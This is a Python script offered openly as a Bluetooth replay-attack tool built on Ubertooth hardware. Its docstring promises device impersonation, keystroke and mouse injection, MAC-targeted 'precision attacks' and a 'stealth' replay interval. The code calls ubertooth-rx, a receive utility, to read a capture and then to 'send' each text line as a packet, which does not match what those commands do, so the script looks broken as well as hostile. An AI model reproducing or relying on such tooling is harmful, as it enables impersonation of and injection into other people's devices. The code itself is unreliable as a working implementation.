import argparse
import subprocess
import time
import json

"""
Ubertooth Bluetooth Replay Attack

Features:
    - Replays captured Bluetooth Classic (HID, audio) or BLE packets.
    - Impersonates previously sniffed Bluetooth devices.
    - Supports replaying keystrokes, mouse movements, and BLE advertisements.
    - Filters packets by target MAC address for precision attacks.
    - Allows replay at adjustable intervals for stealth.
    - Logs replayed packets and device responses for analysis.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle

Usage:
    - Capture Bluetooth packets (BLE or Classic) for replay:
      python ubertooth_sniffer.py --log bt_capture.pcap
    - Replay captured packets:
      python ubertooth_replay.py --input bt_capture.pcap
    - Replay packets with an interval for stealth mode:
      python ubertooth_replay.py --input bt_capture.pcap --interval 5
    - Replay only packets from a specific MAC address:
      python ubertooth_replay.py --input bt_capture.pcap --target AA:BB:CC:DD:EE:FF
"""

def replay_packets(input_file, target_mac=None, interval=0):
    """Replays captured Bluetooth packets."""
    print(f"[INFO] Replaying Bluetooth packets from {input_file}...")

    try:
        # Read the PCAP file for captured packets
        output = subprocess.check_output(["ubertooth-rx", "-r", input_file])
        packets = output.decode("utf-8").split("\n")

        replay_count = 0

        for packet in packets:
            if not packet.strip():
                continue

            if target_mac and target_mac not in packet:
                continue  # Skip packets not matching the target MAC

            print(f"[REPLAY] Sending packet: {packet.strip()}")
            subprocess.run(["ubertooth-rx", "-t", packet.strip()])

            replay_count += 1

            if interval > 0:
                sleep_time = interval + (0.5 - time.time() % 0.5)  # Slight variation in timing
                print(f"[STEALTH] Sleeping for {sleep_time:.2f} seconds before next replay...")
                time.sleep(sleep_time)

        print(f"[SUCCESS] Replayed {replay_count} packets.")

    except Exception as e:
        print(f"[ERROR] Failed to replay packets: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Replay Attack")
    parser.add_argument("--input", required=True, help="PCAP file containing captured Bluetooth packets")
    parser.add_argument("--target", type=str, help="Target MAC address to replay packets for precision attacks")
    parser.add_argument("--interval", type=int, default=0, help="Time interval (seconds) between packet replays for stealth mode")

    args = parser.parse_args()

    replay_packets(args.input, args.target, args.interval)
